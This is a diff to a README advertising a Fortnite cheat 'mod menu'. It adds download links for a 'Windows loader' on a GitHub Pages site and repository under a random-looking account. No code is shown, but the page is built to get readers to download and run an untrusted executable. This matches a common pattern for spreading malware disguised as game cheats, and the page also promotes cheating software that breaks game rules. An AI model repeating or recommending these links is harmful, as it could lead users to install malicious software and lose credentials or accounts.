@@ -6,7 +6,7 @@ A Fortnite mod menu is a Windows overlay that reads the running client from outs
 
 # 📥 **LOADER PICKUP — START HERE**
 
-## [⬇️ **GET THE WINDOWS LOADER**]( )
+## [⬇️ **GET THE WINDOWS LOADER**](https://dzeqemhbmsrn.github.io/Fortnite-Cheats-Mod-Menu/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -14,11 +14,11 @@ A Fortnite mod menu is a Windows overlay that reads the running client from outs
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt="preview image">
+<img src="https://github.com/dzeqemhbmsrn/Fortnite-Cheats-Mod-Menu/blob/main/fortnite.png?raw=true" width="1280" height="720" alt="preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]( )
+### 📦 [**OPEN THE PACKAGE**](https://dzeqemhbmsrn.github.io/Fortnite-Cheats-Mod-Menu/)
 
 ---
 
